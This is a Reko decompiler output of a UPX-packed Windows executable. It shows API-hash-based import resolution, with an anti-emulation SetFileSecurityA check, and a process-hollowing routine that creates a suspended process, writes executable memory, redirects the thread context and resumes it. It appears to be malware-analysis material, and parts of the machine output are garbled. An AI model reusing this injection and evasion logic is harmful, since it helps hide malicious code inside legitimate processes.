// subject_UPX0.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Register word32 eax, Register ui32 ecx, Register out ptr32 ecxOut)
// Called from:
//      fn00403725
word32 fn00401000(word32 eax, ui32 ecx, ptr32 & ecxOut)
{
	ptr32 fp;
	struct Eq_6 * esp_139;
	word32 eax_140;
	word32 ecx_141;
	g_ptr40636C();
	esp_139->dwFFFFFFFC = g_dw406020;
	esp_139->dwFFFFFFF8 = 0x00406268;
	struct Eq_20 * esp_182;
	word32 eax_183;
	word32 ecx_184;
	g_ptr406370();
	esp_182->dwFFFFFFFC = g_dw406010;
	esp_182->dwFFFFFFF8 = 0x00406268;
	struct Eq_34 * esp_231;
	word32 eax_232;
	word32 ecx_233;
	g_ptr406370();
	esp_231->dwFFFFFFFC = g_dw40603C;
	esp_231->dwFFFFFFF8 = 0x00406268;
	struct Eq_47 * esp_317;
	word32 eax_318;
	word32 ecx_319;
	g_ptr406370();
	esp_317->dwFFFFFFFC = 0x00406164;
	esp_317->dwFFFFFFF8 = 0x00406268;
	struct Eq_59 * esp_363;
	word32 eax_364;
	word32 ecx_365;
	g_ptr406370();
	g_dw406374 = 0x44;
	g_dw4063A0 = 0x01;
	g_w4063A4 = 0x02;
	esp_363->dwFFFFFFFC = 0x004063B8;
	esp_363->dwFFFFFFF8 = 0x00406374;
	esp_363->dwFFFFFFF4 = 0x00;
	esp_363->dwFFFFFFF0 = 0x00;
	esp_363->dwFFFFFFEC = 0x04;
	esp_363->dwFFFFFFE8 = 0x00;
	esp_363->dwFFFFFFE4 = 0x00;
	esp_363->dwFFFFFFE0 = 0x00;
	esp_363->dwFFFFFFDC = 0x00406268;
	esp_363->dwFFFFFFD8 = 0x00;
	struct Eq_112 * esp_621;
	word32 ecx_623;
	g_ptr4063C8();
	esp_621->tFFFFFFFC = null;
	Eq_120 eax_641 = GetModuleHandleA(esp_621->tFFFFFFFC);
	word32 eax_733 = Mem640[eax_641 + 60:word32] + eax_641;
	esp_621->tFFFFFFFC = (CHAR *) 0x40;
	esp_621->dwFFFFFFF8 = 0x3000;
	esp_621->dwFFFFFFF4 = eax_733->dw0050;
	esp_621->tFFFFFFF0 = eax_641;
	esp_621->dwFFFFFFEC = g_dw4063B8;
	struct Eq_155 * esp_819;
	word32 eax_820;
	word32 ecx_821;
	g_ptr4063CC();
	esp_819->ptrFFFFFFFC = fp - 8;
	esp_819->dwFFFFFFF8 = eax_733->dw0050;
	esp_819->tFFFFFFF4 = eax_641;
	esp_819->dwFFFFFFF0 = eax_820;
	esp_819->dwFFFFFFEC = g_dw4063B8;
	struct Eq_181 * esp_910;
	word32 eax_911;
	word32 ecx_912;
	g_ptr4063D0();
	g_dw4063D4 = 0x00010007;
	esp_910->dwFFFFFFFC = 0x004063D4;
	esp_910->dwFFFFFFF8 = g_dw4063BC;
	struct Eq_198 * esp_1082;
	word32 ecx_1084;
	g_ptr4066A0();
	g_dw40648C = 0x00402533;
	esp_1082->dwFFFFFFFC = 0x004063D4;
	esp_1082->dwFFFFFFF8 = g_dw4063BC;
	struct Eq_213 * esp_1118;
	word32 eax_1119;
	word32 ecx_1120;
	g_ptr4066A4();
	esp_1118->dwFFFFFFFC = g_dw4063BC;
	word32 eax_1171;
	ptr32 ecx_1172;
	g_ptr4066A8();
	ecxOut = ecx_1172;
	return eax_1171;
}

// 00403253: Register word32 fn00403253(Stack Eq_120 dwArg04, Stack uint32 dwArg08, Register out Eq_120 ecxOut)
// Called from:
//      fn00403725
word32 fn00403253(Eq_120 dwArg04, uint32 dwArg08, HMODULE & ecxOut)
{
	word32 eax_108 = Mem17[Mem17[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_111[] = dwArg04 + eax_108->dw0024 / 4;
	uint32 esi_19 = dwArg08;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		esi_19 = dwArg08 + 983337;
	word32 eax_217[] = dwArg04 + eax_108->dw0020 / 4;
	word32 eax_221[] = dwArg04 + eax_108->dw001C / 4;
	int32 edi_223 = 0x00;
	while (true)
	{
		word32 eax_449;
		if (edi_223 >= eax_108->dw0018)
			break;
		int32 eax_237 = dwArg04 + eax_217[edi_223] / 4;
		byte dwLoc1C_489[] = null;
		uint32 dwLoc20_490 = 0x00;
		while (dwLoc1C_489[eax_237] != 0x00)
		{
			dwLoc20_490 = (int32) dwLoc1C_489[eax_237] ^ 0x90 ^ (dwLoc20_490 << 0x07 | dwLoc20_490 >> 0x19);
			dwLoc1C_489 = (byte (*)[]) (dwLoc1C_489 + 1);
		}
		if (dwLoc20_490 == esi_19)
		{
			eax_449 = dwArg04 + eax_221[(word32) eax_111[edi_223]] / 4;
			goto l0040371C;
		}
		++edi_223;
	}
	eax_449 = 0x00;
l0040371C:
	ecxOut = dwArg04;
	return eax_449;
}

// 00403725: void fn00403725()
void fn00403725()
{
	ptr32 fp;
	Eq_120 eax_15 = LoadLibraryW(&g_t405000);
	word32 ecx_1841;
	g_ptr4063C8 = fn00403253(eax_15, 0x4C25A292, out ecx_1841);
	word32 ecx_1842;
	g_ptr4063CC = fn00403253(eax_15, 0x90AB90F3, out ecx_1842);
	word32 ecx_1843;
	g_ptr4063D0 = fn00403253(eax_15, 4230329632, out ecx_1843);
	word32 ecx_1844;
	g_ptr4066A0 = fn00403253(eax_15, 0xA008EA3A, out ecx_1844);
	word32 ecx_1845;
	g_ptr4066A4 = fn00403253(eax_15, 0xA008C23A, out ecx_1845);
	word32 ecx_1846;
	g_ptr4066A8 = fn00403253(eax_15, 4171011946, out ecx_1846);
	word32 ecx_1847;
	g_ptr4066BC = fn00403253(eax_15, ~0x61F108FC, out ecx_1847);
	word32 ecx_1848;
	g_ptr406CEC = fn00403253(eax_15, 378929992, out ecx_1848);
	word32 ecx_1849;
	g_ptr4066DC = fn00403253(eax_15, 0x4BB8A877, out ecx_1849);
	word32 ecx_1850;
	g_ptr406370 = fn00403253(eax_15, 0x3FA7B9FF, out ecx_1850);
	word32 ecx_1851;
	g_ptr40636C = fn00403253(eax_15, 0x3FA3FF7F, out ecx_1851);
	word32 ecx_1852;
	g_ptr4066B8 = fn00403253(eax_15, 1044821247, out ecx_1852);
	word32 ecx_1853;
	g_ptr4066D0 = fn00403253(eax_15, 800930412, out ecx_1853);
	word32 ecx_1854;
	g_ptr4066E0 = fn00403253(eax_15, 146194675, out ecx_1854);
	word32 ecx_1855;
	g_ptr4066E4 = fn00403253(eax_15, 0x02F6D88E, out ecx_1855);
	word32 ecx_1856;
	g_ptr4066C0 = fn00403253(eax_15, 2348734789, out ecx_1856);
	word32 ecx_1857;
	g_ptr4066C8 = fn00403253(eax_15, 2352602586, out ecx_1857);
	word32 ecx_1045;
	g_ptr4066CC = fn00403253(eax_15, 4047018116, out ecx_1045);
	struct Eq_439 * esp_1060;
	word32 ecx_1062;
	g_ptr40636C();
	esp_1060->dwFFFFFFFC = g_dw406040;
	esp_1060->ptrFFFFFFF8 = fp - 36;
	struct Eq_452 * esp_1087;
	word32 ecx_1089;
	g_ptr406370();
	esp_1087->dwFFFFFFFC = g_dw406004;
	esp_1087->ptrFFFFFFF8 = fp - 36;
	struct Eq_465 * esp_1124;
	word32 ecx_1126;
	g_ptr406370();
	esp_1124->dwFFFFFFFC = g_dw406018;
	esp_1124->ptrFFFFFFF8 = fp - 36;
	struct Eq_478 * esp_1224;
	word32 ecx_1226;
	g_ptr406370();
	esp_1224->ptrFFFFFFFC = fp - 36;
	struct Eq_486 * esp_1254;
	Eq_120 eax_1255;
	g_ptr4066DC();
	esp_1254->dwFFFFFFFC = 1827147831;
	esp_1254->tFFFFFFF8 = eax_1255;
	word32 ecx_1858;
	g_ptr4066AC = fn00403253(esp_1254->tFFFFFFF8, esp_1254->dwFFFFFFFC, out ecx_1858);
	esp_1254->dwFFFFFFFC = 2186089862;
	esp_1254->tFFFFFFF8 = eax_1255;
	word32 ecx_1859;
	g_ptr4066B0 = fn00403253(esp_1254->tFFFFFFF8, esp_1254->dwFFFFFFFC, out ecx_1859);
	esp_1254->dwFFFFFFFC = ~0x4D97488C;
	esp_1254->tFFFFFFF8 = eax_1255;
	word32 ecx_1860;
	g_ptr4066B4 = fn00403253(esp_1254->tFFFFFFF8, esp_1254->dwFFFFFFFC, out ecx_1860);
	esp_1254->dwFFFFFFFC = 0x10342377;
	esp_1254->tFFFFFFF8 = eax_1255;
	word32 ecx_1861;
	g_ptr4066C4 = fn00403253(esp_1254->tFFFFFFF8, esp_1254->dwFFFFFFFC, out ecx_1861);
	esp_1254->dwFFFFFFFC = 0x3191F13D;
	esp_1254->tFFFFFFF8 = eax_1255;
	word32 ecx_1508;
	<anonymous> * eax_1507 = fn00403253(esp_1254->tFFFFFFF8, esp_1254->dwFFFFFFFC, out ecx_1508);
	g_ptr4066D8 = eax_1507;
	esp_1254->dwFFFFFFFC = g_dw406034;
	struct Eq_590 * esp_1609;
	Eq_120 eax_1610;
	g_ptr4066DC();
	esp_1609->dwFFFFFFFC = ~0x22E01F37;
	esp_1609->tFFFFFFF8 = eax_1610;
	ui32 ecx_1647;
	<anonymous> * eax_1646 = fn00403253(esp_1609->tFFFFFFF8, esp_1609->dwFFFFFFFC, out ecx_1647);
	g_ptr4066D4 = eax_1646;
	ui32 ecx_1719;
	word32 eax_1773 = fn00401000((char *) eax_1646 + ecx_1647 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02 + ecx_1647 * 0x02, ecx_1647, out ecx_1719) + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02 + ecx_1719 * 0x02;
	esp_1609->dwFFFFFFFC = 0x00;
	g_ptr406CEC();
}

WCHAR g_t405000 = 'k'; // 00405000
word32 g_dw406004 = 0x00405109; // 00406004
word32 g_dw406010 = 0x004050FE; // 00406010
word32 g_dw406018 = 0x004050F7; // 00406018
word32 g_dw406020 = 0x004050EC; // 00406020
uint32 g_dw406034 = 0x00405051; // 00406034
word32 g_dw40603C = 0x00405049; // 0040603C
word32 g_dw406040 = 0x00405046; // 00406040
<anonymous> * g_ptr40636C = null; // 0040636C
<anonymous> * g_ptr406370 = null; // 00406370
word32 g_dw406374 = 0x00; // 00406374
word32 g_dw4063A0 = 0x00; // 004063A0
word16 g_w4063A4 = 0x00; // 004063A4
word32 g_dw4063B8 = 0x00; // 004063B8
word32 g_dw4063BC = 0x00; // 004063BC
<anonymous> * g_ptr4063C8 = null; // 004063C8
<anonymous> * g_ptr4063CC = null; // 004063CC
<anonymous> * g_ptr4063D0 = null; // 004063D0
word32 g_dw4063D4 = 0x00; // 004063D4
word32 g_dw40648C = 0x00; // 0040648C
<anonymous> * g_ptr4066A0 = null; // 004066A0
<anonymous> * g_ptr4066A4 = null; // 004066A4
<anonymous> * g_ptr4066A8 = null; // 004066A8
<anonymous> * g_ptr4066AC = null; // 004066AC
<anonymous> * g_ptr4066B0 = null; // 004066B0
<anonymous> * g_ptr4066B4 = null; // 004066B4
<anonymous> * g_ptr4066B8 = null; // 004066B8
<anonymous> * g_ptr4066BC = null; // 004066BC
<anonymous> * g_ptr4066C0 = null; // 004066C0
<anonymous> * g_ptr4066C4 = null; // 004066C4
<anonymous> * g_ptr4066C8 = null; // 004066C8
<anonymous> * g_ptr4066CC = null; // 004066CC
<anonymous> * g_ptr4066D0 = null; // 004066D0
<anonymous> * g_ptr4066D4 = null; // 004066D4
<anonymous> * g_ptr4066D8 = null; // 004066D8
<anonymous> * g_ptr4066DC = null; // 004066DC
<anonymous> * g_ptr4066E0 = null; // 004066E0
<anonymous> * g_ptr4066E4 = null; // 004066E4
<anonymous> * g_ptr406CEC = null; // 00406CEC
